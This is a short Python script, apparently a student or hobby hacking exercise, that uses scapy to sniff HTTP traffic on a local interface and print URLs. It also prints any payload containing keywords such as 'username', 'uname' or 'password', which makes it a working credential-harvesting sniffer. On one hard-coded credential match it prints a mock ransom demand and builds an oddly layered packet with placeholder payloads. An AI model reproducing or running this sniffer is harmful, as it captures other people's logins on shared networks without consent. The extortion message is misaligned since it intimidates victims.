import scapy.all as scapy
from scapy_http import http

def sniff(interface):
    # print("vsvs")
    scapy.sniff(iface=interface, store=False,
                prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    # print("xoxo")
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname",
                    "user", "login",
                    "password", "pass"]
        for keyword in keywords:
            if keyword.encode() in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode("utf-8"))

        login_info = get_login_info(packet)
        if login_info:
            # print("hihi")
            print("\n\n[+] Possible username/password > "
                  + login_info.decode()
                  + "\n\n")
            if (login_info.decode() == "uname=" + "000" + "&" + "pass=" + "123"):
                print("You're Hacked ! ! ! ! ! !\nYou must transfer $100 to this account < nukcsie >\nOR!!!\n[Warning] : Your computer will crash forever")
                arp_request = scapy.ARP(pdst = "192.168.206.1")
                broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
                ippkt = scapy.IP(dst="192.168.206.101",ttl=10)
                tcp = scapy.TCP(sport=8888, dport=80)
                payload="stfu2"
                arp_request_broadcast = broadcast / arp_request/ippkt/tcp/payload
                
                print(arp_request_broadcast.payload.layers())
                #rawPayload = (arp_request_broadcast.getlayer(scapy.IP).version)
                #rawPayload = arp_request_broadcast.layers()
                arp_request_broadcast.getlayer(scapy.packet.Raw).load="stfu3"
                rawPayload = (arp_request_broadcast.getlayer(scapy.packet.Raw).load)

                print(rawPayload)



sniff("enp0s3")